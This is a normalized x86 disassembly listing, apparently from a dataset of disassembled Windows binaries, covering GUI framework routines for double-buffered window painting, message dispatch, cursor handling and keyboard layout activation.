jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_444e8e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_446be4
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_441578
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_444d3c
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_446be4
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_444e9c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44482c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_444ebc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_44482c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_444f30
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44482c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_444f50
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44482c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_444f70
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44482c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_444f94
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44482c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_444fb8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44482c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_444fdc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44482c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445000
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_430fe0
mov edi eax
mov eax edi
call sub_4310c0
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_423754
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_446be4
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_4311c0
jmp r-xdata
sub_445088
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_441eac
test bl bl
je r-xdata
mov eax edi
call sub_446ef4
mov eax edi
call sub_446aec
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_446aec
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_445148
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_441b08
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_445198
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_446ef4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_44346c
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403448
sub_4451e0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_43ff08
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_444498
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45fa3c
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45df24
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_445330
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_44540f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445416
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_446be4
mov dl [ ebx + 0x184 ]
call sub_44b844
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45de9c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_408144
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45dc9c
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45dc9c
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45dc9c
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_44541c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4454a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4454ad
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45de9c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_408144
test eax eax
je r-xdata
mov eax ebx
call sub_446be4
mov dl 0x1
call sub_44b828
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_445508
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_418df4
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_441578
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_445558
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_44558a
mov eax eax
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403448
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403448
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_4455cc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_441578
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_445624
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4200e0
mov edx [ r-xdata ]
call sub_4033fc
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_44565c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_41a238
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44567e
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_446be4
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_4456dc
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_445648
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_41a238
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_44571c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_4059e4
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_4059e4
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_445788
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_445830
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445837
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_43e070
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_40324c
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_4059cc
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403448
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_4059e4
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ edi + 0x178 ] eax
sub_445840
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_443444
xor edx edx
push ebp
push sub_445902
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403448
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445909
mov eax [ ebp - 0x4 ]
call sub_44344c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_445909
mov eax [ ebp - 0x4 ]
call sub_457218
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_440624
sub_445952
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_403194
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442238
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_4459be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_440624
sub_4459d8
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_445a00
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_457218
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_457120
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403448
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_445a00
test al al
jne r-xdata
sub_445a68
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445a00
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_447d50
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445a94
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445a00
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_447d50
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445ac0
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_445ae8
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_457218
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_457120
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403448
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_445ae8
test al al
jne r-xdata
sub_445b50
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445ae8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445b70
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445ae8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445bb0
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_457218
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403448
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_445bb0
test al al
jne r-xdata
sub_445c14
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445bb0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445c34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4438dc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4438a0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_441578
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_445c34
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_445ce4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_445c34
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_457218
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_441578
test eax eax
jne r-xdata
sub_445d8c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44482c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445dac
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44482c
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445de0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44482c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445e00
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_445e50
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_445e74
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_43f690
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4438dc
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_4438a0
mov dl [ esp ]
mov si 0xffd1
call sub_403448
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_445ecc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403448
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_445ef0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403448
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_445f28
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44204c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_44393c
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_44414c
sub_445f60
push ebx
push esi
